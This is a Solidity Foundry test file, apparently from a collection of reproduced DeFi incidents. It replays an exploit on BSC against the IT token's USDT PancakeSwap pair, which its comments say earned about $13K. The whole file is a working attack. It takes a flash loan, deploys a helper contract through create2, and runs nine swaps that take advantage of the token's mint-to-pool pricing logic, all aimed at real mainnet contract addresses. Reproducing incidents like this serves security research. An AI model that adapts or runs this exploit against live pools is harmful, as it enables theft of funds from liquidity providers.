// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// TX : https://phalcon.blocksec.com/explorer/tx/bsc/0xb33057f57ce451aa8cbb65508d298fe3c627509cc64a394736dace2671b6dcfa
// GUY : https://twitter.com/0xNickLFranklin/status/1768171595561046489
// Profit : ~13K USD
// REASON : Business Logic Flaw
// Transfer from pool,will lead to mint to pool.Seems easy,but a bit hard to make this poc.

contract ContractTest is Test {
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    Uni_Pair_V3 pool = Uni_Pair_V3(0x92b7807bF19b7DDdf89b706143896d05228f3121);
    Uni_Pair_V2 IT_USDT = Uni_Pair_V2(0x7265553986a81c838867aA6B3625ABA97B961f00); 
    // token0 IT token1 USDT
    Uni_Router_V2 router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 IT = IERC20(0x1AC5Fac863c0a026e029B173f2AE4D33938AB473);
    uint256 constant PRECISION = 10**18;
    address test_contract = address(this);
    address hack_contract ;
    function setUp() external {
        cheats.createSelectFork("bsc", 36934258);
        deal(address(USDT), address(this), 0);
    }

    function testExploit() external {
        emit log_named_decimal_uint("[Begin] Attacker USDT before exploit", USDT.balanceOf(address(this)), 18);
        pool.flash(address(this),2000000000000000000000,0,"");
        emit log_named_decimal_uint("[End] Attacker USDT after exploit", USDT.balanceOf(address(this)), 18);
    }

    function pancakeV3FlashCallback(uint256 fee0, uint256, /*fee1*/ bytes memory /*data*/ ) public {
        bytes memory bytecode = type(Money).creationCode;
        uint256 _salt = 0;
        bytecode = abi.encodePacked(bytecode, abi.encode(test_contract));
        bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), address(this), _salt, keccak256(bytecode)));
        hack_contract =  address(uint160(uint256(hash)));
        console.log(hack_contract);
        USDT.transfer(address(hack_contract),2000000000000000000000);
        address addr;
        // Use create2 to send money first.
        assembly {
            addr := create2(0, add(bytecode, 0x20), mload(bytecode), _salt)
        }
        // Money hackContract = new Money((address(this)));
        USDT.transferFrom(hack_contract,address(this),USDT.balanceOf(hack_contract));
        USDT.transfer(address(pool),2000 ether + fee0);
    }

    function hack(address a) public{  
        uint256 i = 0;
        while(i < 9){
            console.log("Time : ",i);
            USDT.transferFrom(a,address(IT_USDT),2000000000000000000000);
            uint256 pair_balance = IT.balanceOf(address(IT_USDT));
            uint256 usdt_balance = USDT.balanceOf(address(IT_USDT));
            // 0 ->IT  1->USDT
            (uint256 _reserve0,uint256 _reserve1 ,) = IT_USDT.getReserves();
            uint256 balance0 = mintToPoolIfNeeded(_reserve0 - 1) + 1;
            uint256 balance1 = ((_reserve0 * _reserve1 * 10000 * 10000) / ((balance0 * 10000) - (balance0 - 1) * 25) + 2000 ether * 25) / 10000 ;
            uint256 amountout = usdt_balance - balance1;
            console.log("amountout %e",amountout);
            IT_USDT.swap(_reserve0 - 1,amountout - 1,a, "");
            i ++;
        }
    }


    function max(uint256 a, uint256 b) external pure returns (uint256) {
        return a >= b ? a : b;
    }
    
    function min(uint256 a, uint256 b) external pure returns (uint256) {
        return a <= b ? a : b;
    }

    function feed(address a) public{
        USDT.approve(a,type(uint256).max -1);
    }

    function mintToPoolIfNeeded (uint256 amount) public returns (uint256) {
        uint256 tokenUsdtRate;
        (uint112 reserve0, uint112 reserve1, ) = IT_USDT.getReserves();

        uint256 tokenReserve;
        uint256 usdtReserve;

        if(address(IT) == IT_USDT.token0()){
            tokenReserve = uint256(reserve0);
            usdtReserve = uint256(reserve1);
        } else {
            tokenReserve = uint256(reserve1);
            usdtReserve = uint256(reserve0);
        }
        tokenUsdtRate = uint256(usdtReserve) * (PRECISION) / (uint256(tokenReserve));

        // uint256 k = tokenReserve.mul(usdtReserve);

        uint256 tokenReserveAfterBuy = tokenReserve - amount;
        // uint256 usdtReserveAfterBuy = k.div(tokenReserveAfterBuy);
        uint256 usdtReserveAfterBuy = this.min(tokenReserve * (usdtReserve) / (tokenReserveAfterBuy), USDT.balanceOf(address(IT_USDT))); // min impltementing rule 3

        uint256 maxTokenUsdtRateAfterBuy = tokenUsdtRate + (tokenUsdtRate / (100));

        uint256 tokenMinReserveAfterBuy = usdtReserveAfterBuy * (PRECISION) / (maxTokenUsdtRateAfterBuy);

        if(tokenReserveAfterBuy >= tokenMinReserveAfterBuy){
            return amount / 2;
        } else {
            return this.max(tokenMinReserveAfterBuy - (tokenReserveAfterBuy), amount / 2);
        }
    }

}

contract Money {
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    constructor(address _address) {
        USDT.approve(_address,type(uint256).max -1);
        _address.call(abi.encodeWithSignature("feed(address)",address(this)));
        _address.call(abi.encodeWithSignature("hack(address)",address(this)));
    }
    
}
